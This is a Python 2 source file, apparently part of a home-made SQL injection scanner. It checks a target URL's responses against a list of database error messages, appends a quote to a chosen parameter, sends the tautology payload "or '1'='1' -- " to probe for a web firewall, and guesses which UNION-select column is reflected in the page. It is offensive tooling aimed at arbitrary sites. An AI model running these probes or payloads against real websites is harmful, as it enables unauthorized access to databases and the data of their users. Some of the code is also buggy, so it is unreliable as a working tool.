from requests import get_the_page
from response import site_alive

errors = ["You have an error in your SQL syntax","Execution of a query to the database failed", "Unknown column", "404 Error Message", "mysql_num_rows()",
               "mysql_fetch_array()", "Error Occurred While Processing Request","Server Error in '/' Application",
               "Microsoft OLE DB Provider for ODBC Drivers error", "error in your SQL syntax", "include()",
               "Invalid Querystring", "OLE DB Provider for ODBC","Error: You have an error in your SQL syntax", "VBScript Runtime", "ADODB.Field", "BOF or EOF",
               "ADODB.Command","JET Database","mysql_fetch_row()", "Syntax error", "mysql_fetch_assoc()", "mysql_fetch_object()",
               "mysql_numrows()", "GetArray()", "FetchRow()","input string was not in a correct format",
               "MSSQL_Uqm: Unclosed quotation mark","JDBC_CFM2 : SQLServer JDBC Driver", "JDBC_CFM': Error Executing Database Query", "Oracle: ORA-01756","Division by zero",
               "Failed Query"]

def vuln(site):
    vuln_move = 0
    has_firewall(site)
    if '=' in site:
        flag=''
        flag=find_vulnerable_param(site)
        if flag!='':
            the_page=get_the_page(site,"1")
            index=0
            length=len(errors)
            while index<length and vuln_move==0:
                if errors[index] in the_page:
                    print "The site is Sqli Vulnerable"
                    vuln_move=1
                else:
                    index=index+1
            if vuln_move==0:
                print "Is this the vulnerable parameter %s?(y/n)" %flag
                ans=raw_input()
                while ans!='y' and ans!='Y' and ans!='n' and ans!='N':
                    print "WRONG INPUT! \nIs this the vulnerable parameter %s?(y/n)" %flag
                    ans=raw_input()
                if ans=='Y' or ans=='y':
                    print 'This parameter is not vulnerable'
                    print 'Program will exit'
                    exit()
                if ans=='N' or ans=='n':
                    print "Give me the vulnerable parameter: "
                    parameter=raw_input()
                    site.replace(parameter,parameter+"'")
                    the_page=get_the_page(site,"1")
                    index=0
                    while index<length and vuln_move==0:
                        if errors[index] in the_page:
                            print "The site is Sqli Vulnerable"
                            print "The error is: %s" %errors[index]
                            vuln_move=1
                        else:
                            index+=1
                if vuln_move==0:
                    print 'This parameter is not vulnerable'
                    print 'Program will exit'
                    exit()
            else:
                return(flag)
    else:
        print "Are you sure that you gave the correct url?(y/n)"
        ans=raw_input()
        while ans!='y' and ans!='Y' and ans!='n' and ans!='N':
            print "WRONG INPUT! \nAre you sure that you gave the correct url?(y/n)"
            ans=raw_input()
        if ans=='y' or ans=='Y':
            print "This is not a vulnerable url"
            print "Program will exit"
            exit()
        else:
            return ("1")

def f_vuln_col(site,columns):   #<--- Edw kai katw ftia3imo
    vuln_column=1
    flag=1
    the_page = get_the_page(site,"1")
    while flag==1:
        if (">"+str(vuln_column)+"</") in the_page:
            flag=0
        elif (str(vuln_column)+"</") in the_page:
            flag=0
        elif (">"+str(vuln_column)) in the_page:
            flag=0
        elif (str(vuln_column)+"<") in the_page:
            flag=0
        else:
            vuln_column=vuln_column+1
        if vuln_column>columns+1:
            flag=2
    if flag==2:
        for i in range (1,columns+1):
            if str(i) in the_page:
                flag=0
                vuln_column=i
    return(vuln_column)

def find_vulnerable_param(site):
    param=''
    i=len(site)-2
    while i>0:
        if site[i]=='=':
            while site[i]<>'?':
                param=param+site[i]
                i=i-1
            i=-1
        i=i-1
    param=param[::-1]
    return param


def has_firewall(site):
    site=site.replace("'",'')
    site=site+"or '1'='1' -- "
    the_page=get_the_page(site,"1")
    if ('Not Acceptable!' in the_page) or ('forbiden' in the_page):
        print "Firewall detected"
        print "Bypassing firewalls under construction"
    else:
        print "No Firewall detected!"
    
    
